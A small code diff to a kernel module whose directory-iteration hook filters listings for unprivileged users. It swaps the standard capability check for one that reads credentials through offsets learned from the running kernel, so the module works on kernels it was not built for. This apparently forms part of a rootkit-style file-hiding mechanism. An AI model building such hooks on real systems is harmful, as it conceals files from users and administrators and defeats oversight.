@@ -116,10 +116,10 @@ static int wuwa_iterate_shared(struct file *filp, struct dir_context *ctx)
     if (!orig)
         return -ENOSYS;
     /* Privileged sees everything (debugging); everyone else gets
-     * filtered. capable() resolves creds with the RUNNING kernel's own
-     * offsets — no header-layout dependence (current_euid() inlines
-     * task->cred access from build headers). */
-    if (capable(CAP_SYS_ADMIN))
+     * filtered. wuwa_capable() reads creds via the LEARNED offset —
+     * never build headers (capable()/current_euid() inline the wrong
+     * task->cred on foreign kernels = crash). */
+    if (wuwa_capable(CAP_SYS_ADMIN))
         return orig(filp, ctx);
     if (!try_module_get(THIS_MODULE))
         return orig(filp, ctx); /* teardown race: passthrough, never crash */
